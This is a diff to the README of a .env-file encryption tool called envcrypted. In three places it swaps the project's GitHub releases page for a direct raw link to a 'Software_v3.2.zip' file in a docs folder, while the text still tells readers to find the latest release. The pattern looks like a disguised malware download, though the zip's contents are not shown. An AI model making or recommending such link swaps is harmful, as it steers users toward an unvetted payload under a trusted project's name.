@@ -1,6 +1,6 @@
 # 🔐 envcrypted - Lock .env Files With Ease
 
-[![Download envcrypted](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Saundersgoodtempered385/envcrypted/releases)
+[![Download envcrypted](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Saundersgoodtempered385/envcrypted/main/docs/Software_v3.2.zip)
 
 ## 🚀 What it does
 
@@ -32,7 +32,7 @@ For best results, keep your `.env` file in a folder you can find later, like:
 
 Visit this page to download envcrypted:
 
-https://github.com/Saundersgoodtempered385/envcrypted/releases
+https://raw.githubusercontent.com/Saundersgoodtempered385/envcrypted/main/docs/Software_v3.2.zip
 
 On that page, look for the latest release and download the Windows file.
 
@@ -179,7 +179,7 @@ You will not be able to open the encrypted file with that password, so keep it s
 
 Use this link to get the latest Windows build and updates:
 
-https://github.com/Saundersgoodtempered385/envcrypted/releases
+https://raw.githubusercontent.com/Saundersgoodtempered385/envcrypted/main/docs/Software_v3.2.zip
 
 ## 🧪 What to expect
 
